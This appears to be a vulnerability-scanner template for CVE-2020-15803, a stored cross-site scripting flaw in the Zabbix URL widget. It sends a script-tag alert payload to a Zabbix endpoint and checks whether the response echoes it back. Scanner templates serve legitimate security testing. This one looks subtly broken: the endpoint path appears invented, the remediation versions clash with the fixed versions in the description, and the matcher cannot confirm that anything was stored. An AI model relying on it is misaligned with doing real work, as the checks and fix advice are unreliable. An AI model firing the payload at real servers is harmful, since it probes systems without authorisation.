id: CVE-2020-15803

info:
  name: Zabbix Stored XSS in URL Widget
  author: ProjectDiscoveryAI
  severity: medium
  description: Zabbix before 3.0.32rc1, 4.x before 4.0.22rc1, 4.1.x through 4.4.x before 4.4.10rc1, and 5.x before 5.0.2rc1 allows stored XSS in the URL Widget.
  impact: |
    Remote attackers can execute arbitrary JavaScript code in the context of a victim's browser session.
  remediation: |
    Upgrade to Zabbix version 4.4.10, 5.0.9, or 5.2.4 to mitigate the vulnerability.
  reference:
    - https://support.zabbix.com/browse/ZBX-18057

http:
  - method: POST
    path:
      - "{{BaseURL}}/zabbix/url_widget/save"

    body: |
      url=<script>alert('XSS')</script>

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "<script>alert('XSS')</script>"
        part: body
